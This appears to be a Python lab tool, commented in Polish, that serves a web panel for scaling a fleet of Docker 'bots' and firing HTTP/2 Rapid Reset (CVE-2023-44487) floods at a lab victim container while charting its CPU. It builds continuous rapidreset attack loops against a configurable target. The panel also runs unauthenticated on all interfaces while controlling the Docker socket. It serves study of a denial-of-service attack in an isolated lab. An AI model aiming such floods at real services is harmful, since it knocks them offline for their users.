#!/usr/bin/env python3
"""
Panel sterowania flota botow (HTTP/2 Rapid Reset lab) + podglad na zywo.

Dziala w kontenerze z zamontowanym /var/run/docker.sock. Zarzadza WLASNA pula
kontenerow-botow (nazwy gui-bot-N, etykieta lab-gui-bot=1) przez Docker CLI:
suwak = ile botow ma dzialac; Fire = odpal ruch na calej puli; Stop = przerwij.

GRANICA (bez zmian wzgledem reszty labu): zarzadza wylacznie wlasnymi, z gory
zbudowanymi kontenerami tego labu (obraz BOT_IMAGE, rapidreset/h2load wbudowane).
Brak dystrybucji/implantacji ataku na urzadzenia, ktore go nie maja.

Monitoring (CPU/polaczenia ofiary w czasie) ogladasz w Zabbixie; panel pokazuje
tez lekki podglad (liczba botow + CPU ofiary z `docker stats`).

Tylko biblioteka standardowa. Konfiguracja przez zmienne srodowiskowe:
  LABNET      siec docker, do ktorej podpinane sa boty (domyslnie ddos-lab_labnet)
  BOT_IMAGE   obraz bota (domyslnie ddos-lab-botfleet:latest)
  VICTIM      host:port ofiary dla rapidreset (domyslnie victim:443)
  BOT_CPUSET  cpuset dla botow (domyslnie 2-11)
  BOT_CPUS    limit CPU na bota (domyslnie 0.1)
  VICTIM_CTR  nazwa kontenera ofiary dla `docker stats` (domyslnie lab-victim)
  ZABBIX_URL  link do frontendu Zabbix pokazywany w panelu (domyslnie http://localhost:8080)
  PORT        port panelu (domyslnie 8090)
  MAX_BOTS    gorny limit suwaka (domyslnie 100)
"""
import json
import os
import re
import subprocess
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LABNET = os.environ.get("LABNET", "ddos-lab_labnet")
BOT_IMAGE = os.environ.get("BOT_IMAGE", "ddos-lab-botfleet:latest")
VICTIM = os.environ.get("VICTIM", "victim:443")
BOT_CPUSET = os.environ.get("BOT_CPUSET", "2-11")
BOT_CPUS = os.environ.get("BOT_CPUS", "0.1")
VICTIM_CTR = os.environ.get("VICTIM_CTR", "lab-victim")
ZABBIX_URL = os.environ.get("ZABBIX_URL", "http://localhost:8080")
PORT = int(os.environ.get("PORT", "8090"))
MAX_BOTS = int(os.environ.get("MAX_BOTS", "100"))

NAME_RE = re.compile(r"^gui-bot-(\d+)$")

# Stan ostatniego Fire ("attack"|"legit") albo None po Stop. Trzymany w apce,
# zeby /api/status bylo O(1) (jeden `docker stats` + jeden `docker ps`) zamiast
# odpytywac pgrep w kazdym z potencjalnie 100 botow na kazdy poll.
ATTACK_MODE = None


def docker(*args, timeout=30):
    """Wywolaj docker CLI; zwroc (rc, stdout, stderr)."""
    try:
        p = subprocess.run(
            ["docker", *args],
            capture_output=True, text=True, timeout=timeout,
        )
        return p.returncode, p.stdout.strip(), p.stderr.strip()
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"
    except Exception as e:  # noqa: BLE001
        return 1, "", str(e)


def running_bot_indices():
    rc, out, _ = docker("ps", "--filter", "label=lab-gui-bot=1",
                        "--format", "{{.Names}}")
    idx = []
    if rc == 0 and out:
        for name in out.splitlines():
            m = NAME_RE.match(name.strip())
            if m:
                idx.append(int(m.group(1)))
    return sorted(idx)


def create_bot(i):
    docker("rm", "-f", f"gui-bot-{i}")
    return docker(
        "run", "-d",
        "--name", f"gui-bot-{i}",
        "--label", "lab-gui-bot=1",
        "--init",            # PID1=docker-init (tini) reapuje zabite workery -> brak zombie
        "--network", LABNET,
        "--cpuset-cpus", BOT_CPUSET,
        "--cpus", BOT_CPUS,
        BOT_IMAGE,
    )


def remove_bot(i):
    return docker("rm", "-f", f"gui-bot-{i}")


def scale(n):
    """Doprowadz pule do dokladnie n botow (gui-bot-1..n)."""
    n = max(0, min(MAX_BOTS, int(n)))
    present = set(running_bot_indices())
    desired = set(range(1, n + 1))
    for i in sorted(desired - present):
        create_bot(i)
    for i in sorted(present - desired, reverse=True):
        remove_bot(i)
    return len(running_bot_indices())


def single_cmd(mode, requests, concurrency):
    requests = int(requests)
    concurrency = int(concurrency)
    if mode == "attack":
        return (f"rapidreset -url https://{VICTIM} "
                f"-requests {requests} -concurrency {concurrency} -quiet "
                f">/dev/null 2>&1")
    # legit
    return f"h2load -n {requests} -c {concurrency} https://{VICTIM} >/dev/null 2>&1"


def fire(mode, requests, concurrency, duration):
    """Stop-then-start ruchu na calej puli (idempotentne re-arming)."""
    global ATTACK_MODE
    if mode not in ("attack", "legit"):
        return {"error": "bad mode"}
    stop_all()
    single = single_cmd(mode, requests, concurrency)
    dur = int(duration)
    if dur > 0:
        loop = (f"end=$(( $(date +%s) + {dur} )); "
                f"while [ $(date +%s) -lt $end ]; do {single}; done")
    else:
        loop = f"while true; do {single}; done"  # ciagly do Stop
    idx = running_bot_indices()
    for i in idx:
        docker("exec", "-d", f"gui-bot-{i}", "sh", "-c", loop)
    ATTACK_MODE = mode if idx else None
    return {"fired": len(idx), "mode": mode}


# Ubij procesy ruchu w kontenerze, zachowujac przy zyciu:
#   - PID 1 (docker-init/tini, dzieki --init),
#   - sam wykonujacy to shell ($$),
#   - `sleep infinity` (keepalive = glowne dziecko tini; jego smierc ubilaby kontener).
# To zdejmuje petle `while true; do rapidreset...; done` ORAZ biezace workery.
# `pkill -f rapidreset` NIE dziala - dopasowalby i zabil wlasny exec (jego
# cmdline zawiera "rapidreset"). Osierocone workery reapuje tini -> brak zombie.
_KILL_ALL = (
    'for d in /proc/[0-9]*; do '
    'pid=${d#/proc/}; '
    '[ "$pid" = "1" ] && continue; '
    '[ "$pid" = "$$" ] && continue; '
    'c=$(cat "$d/comm" 2>/dev/null); '
    '[ "$c" = "sleep" ] && continue; '
    '[ "$c" = "docker-init" ] && continue; '
    'kill -9 "$pid" 2>/dev/null; '
    'done; exit 0'
)


def stop_all():
    global ATTACK_MODE
    for i in running_bot_indices():
        docker("exec", f"gui-bot-{i}", "sh", "-c", _KILL_ALL)
    ATTACK_MODE = None
    return {"stopped": True}


def status():
    idx = running_bot_indices()
    # bots_busy liczymy ze stanu apki (ATTACK_MODE), nie przez pgrep per-bot -
    # inaczej przy 100 botach bylby to 100 exec-ow na kazdy poll co 2s.
    busy = len(idx) if ATTACK_MODE else 0
    rc, out, _ = docker("stats", "--no-stream", "--format", "{{.CPUPerc}}", VICTIM_CTR)
    victim_cpu = out.replace("%", "") if rc == 0 and out else None
    return {
        "bots": len(idx),
        "bots_busy": busy,
        "mode": ATTACK_MODE,
        "victim_cpu": victim_cpu,
        "max_bots": MAX_BOTS,
    }


PAGE = """<!doctype html>
<html lang="pl"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Botnet Lab - panel</title>
<style>
:root{--bg:#0f1420;--card:#1a2233;--fg:#e6edf3;--mut:#8aa0b4;--acc:#4da3ff;--danger:#ff5a5a;--ok:#3ddc84;--bd:#2a3550}
*{box-sizing:border-box}
body{margin:0;background:#0f1420;color:#e6edf3;font:15px/1.5 system-ui,Segoe UI,sans-serif}
.wrap{max-width:900px;margin:0 auto;padding:20px}
h1{font-size:20px;margin:0 0 4px}
.sub{color:#8aa0b4;margin:0 0 20px;font-size:13px}
.card{background:#1a2233;border:1px solid #2a3550;border-radius:12px;padding:18px;margin-bottom:16px}
.row{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
label{color:#8aa0b4;font-size:13px}
input[type=range]{width:100%}
.big{font-size:40px;font-weight:700;color:#4da3ff;line-height:1}
.stat{flex:1;min-width:130px;background:#0f1420;border:1px solid #2a3550;border-radius:10px;padding:12px}
.stat .v{font-size:28px;font-weight:700}
.stat .k{color:#8aa0b4;font-size:12px;text-transform:uppercase;letter-spacing:.04em}
button{border:0;border-radius:9px;padding:10px 18px;font-size:14px;font-weight:600;cursor:pointer}
.fire{background:#ff5a5a;color:#fff}
.stop{background:#2a3550;color:#e6edf3}
select,input[type=number]{background:#0f1420;color:#e6edf3;border:1px solid #2a3550;border-radius:8px;padding:8px}
.dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px}
a{color:#4da3ff}
.muted{color:#8aa0b4;font-size:12px}
canvas{width:100%;height:160px;display:block;background:#0f1420;border:1px solid #2a3550;border-radius:10px}
.zbtn{display:inline-block;background:#4da3ff;color:#06111f;padding:10px 18px;border-radius:9px;font-weight:700;text-decoration:none}
</style></head><body><div class="wrap">
<h1>Botnet Lab &mdash; panel sterowania</h1>
<p class="sub">HTTP/2 Rapid Reset (CVE-2023-44487) &middot; cel: <code>__VICTIM__</code> &middot;
monitoring na zywo w <a href="__ZBX__" target="_blank">Zabbixie</a></p>

<div class="card">
  <div class="row" style="justify-content:space-between">
    <div><label>Rozmiar botnetu</label><div class="big"><span id="slval">0</span> <span class="muted">botow</span></div></div>
    <div style="text-align:right"><span class="muted">cel: <span id="sltarget">0</span></span></div>
  </div>
  <input type="range" id="slider" min="0" max="__MAX__" value="0" step="1">
  <div class="muted">Przesun suwak &rarr; pula botow sama sie skaluje (kontenery gui-bot-N na sieci labnet).</div>
</div>

<div class="card">
  <div class="row">
    <div><label>Tryb ruchu</label><br>
      <select id="mode">
        <option value="attack">attack (Rapid Reset)</option>
        <option value="legit">legit (h2load)</option>
      </select></div>
    <div><label>requests / bot</label><br><input type="number" id="requests" value="20000" min="1" style="width:110px"></div>
    <div><label>concurrency / bot</label><br><input type="number" id="concurrency" value="200" min="1" style="width:110px"></div>
    <div style="align-self:flex-end;margin-left:auto" class="row">
      <button class="fire" id="fireBtn">&#9889; Fire</button>
      <button class="stop" id="stopBtn">&#9632; Stop</button>
    </div>
  </div>
  <div class="muted" style="margin-top:8px">Fire = restart ruchu na calej aktualnej puli (tryb ciagly do Stop).
  Po zmianie suwaka w trakcie ataku kliknij Fire ponownie, aby dozbroic nowe boty.</div>
</div>

<div class="card"><div class="row">
  <div class="stat"><div class="k">Boty w puli</div><div class="v" id="stBots">0</div></div>
  <div class="stat"><div class="k">Boty atakujace</div><div class="v" id="stBusy">0</div></div>
  <div class="stat"><div class="k">CPU ofiary</div><div class="v" id="stCpu">&mdash;</div></div>
  <div class="stat"><div class="k">Status</div><div class="v" id="stState" style="font-size:16px"><span class="dot" style="background:#8aa0b4"></span>bezczynny</div></div>
</div></div>

<div class="card">
  <div class="row" style="justify-content:space-between;margin-bottom:10px">
    <strong>CPU ofiary &mdash; podglad na zywo</strong>
    <span class="muted">ostatnie ~2 min (poll co 2s)</span>
  </div>
  <canvas id="cpuChart" width="860" height="160"></canvas>
  <div class="row" style="justify-content:space-between;margin-top:12px">
    <span class="muted">Pelny monitoring (CPU, polaczenia nginx, load, siec, historia) w Zabbixie:<br>
    Monitoring &rarr; Latest data &rarr; host <code>victim</code>.</span>
    <a class="zbtn" href="__ZBX__" target="_blank">Otworz Zabbix &#8599;</a>
  </div>
</div>

<p class="muted">Panel steruje wlasna pula botow tego labu. Nie wgrywa niczego na zewnetrzne hosty.</p>
</div>
<script>
const $ = id => document.getElementById(id);
let scaleTimer = null;

function post(path, body){
  return fetch(path, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body||{})}).then(r=>r.json());
}

$('slider').addEventListener('input', e=>{
  $('slval').textContent = e.target.value;
  $('sltarget').textContent = e.target.value;
});
$('slider').addEventListener('change', e=>{
  const n = parseInt(e.target.value,10);
  clearTimeout(scaleTimer);
  scaleTimer = setTimeout(()=>post('/api/scale',{n}), 150);
});

$('fireBtn').addEventListener('click', ()=>{
  post('/api/fire', {
    mode: $('mode').value,
    requests: parseInt($('requests').value,10),
    concurrency: parseInt($('concurrency').value,10),
    duration: 0
  });
});
$('stopBtn').addEventListener('click', ()=>post('/api/stop',{}));

const cpuHist = [];           // historia CPU% ofiary (ostatnie ~60 probek)
const MAXPTS = 60;

function drawChart(){
  const c = $('cpuChart'); const ctx = c.getContext('2d');
  const W = c.width, H = c.height, pad = 24;
  ctx.clearRect(0,0,W,H);
  // skala: 0..max(100, szczyt)
  const peak = Math.max(100, ...cpuHist);
  // siatka pozioma
  ctx.strokeStyle = '#2a3550'; ctx.fillStyle = '#8aa0b4'; ctx.lineWidth = 1; ctx.font = '11px system-ui';
  [0,0.5,1].forEach(f=>{
    const y = H-pad - f*(H-2*pad);
    ctx.beginPath(); ctx.moveTo(pad,y); ctx.lineTo(W,y); ctx.stroke();
    ctx.fillText(Math.round(f*peak)+'%', 2, y+3);
  });
  if(cpuHist.length<2) return;
  ctx.strokeStyle = '#4da3ff'; ctx.lineWidth = 2; ctx.beginPath();
  cpuHist.forEach((v,i)=>{
    const x = pad + i*(W-pad)/(MAXPTS-1);
    const y = H-pad - (v/peak)*(H-2*pad);
    i?ctx.lineTo(x,y):ctx.moveTo(x,y);
  });
  ctx.stroke();
}

async function poll(){
  try{
    const s = await fetch('/api/status').then(r=>r.json());
    $('stBots').textContent = s.bots;
    $('stBusy').textContent = s.bots_busy;
    const cpu = s.victim_cpu!=null ? parseFloat(s.victim_cpu) : null;
    $('stCpu').textContent = cpu!=null ? cpu.toFixed(1)+'%' : '—';
    const busy = s.bots_busy>0;
    const lbl = busy ? ('ruch: '+(s.mode||'?')) : 'bezczynny';
    $('stState').innerHTML = '<span class="dot" style="background:'+(busy?'#ff5a5a':'#3ddc84')+'"></span>'+lbl;
    if(cpu!=null){ cpuHist.push(cpu); while(cpuHist.length>MAXPTS) cpuHist.shift(); drawChart(); }
    if(document.activeElement!==$('slider')){ $('slider').max = s.max_bots; }
  }catch(e){}
  setTimeout(poll, 2000);
}
drawChart(); poll();
</script>
</body></html>"""


def render_page():
    return (PAGE
            .replace("__VICTIM__", VICTIM)
            .replace("__ZBX__", ZABBIX_URL)
            .replace("__MAX__", str(MAX_BOTS)))


class Handler(BaseHTTPRequestHandler):
    def _send(self, code, body, ctype="application/json"):
        data = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _json_body(self):
        try:
            n = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(n) if n else b"{}"
            return json.loads(raw or b"{}")
        except Exception:  # noqa: BLE001
            return {}

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/index"):
            self._send(200, render_page(), "text/html; charset=utf-8")
        elif self.path == "/api/status":
            self._send(200, json.dumps(status()))
        else:
            self._send(404, json.dumps({"error": "not found"}))

    def do_POST(self):
        body = self._json_body()
        if self.path == "/api/scale":
            self._send(200, json.dumps({"bots": scale(body.get("n", 0))}))
        elif self.path == "/api/fire":
            self._send(200, json.dumps(fire(
                body.get("mode", "attack"),
                body.get("requests", 20000),
                body.get("concurrency", 200),
                body.get("duration", 0),
            )))
        elif self.path == "/api/stop":
            self._send(200, json.dumps(stop_all()))
        else:
            self._send(404, json.dumps({"error": "not found"}))

    def log_message(self, *a):  # cisza w logach
        pass


if __name__ == "__main__":
    print(f"[gui] panel na :{PORT}  labnet={LABNET}  image={BOT_IMAGE}  cel={VICTIM}")
    ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
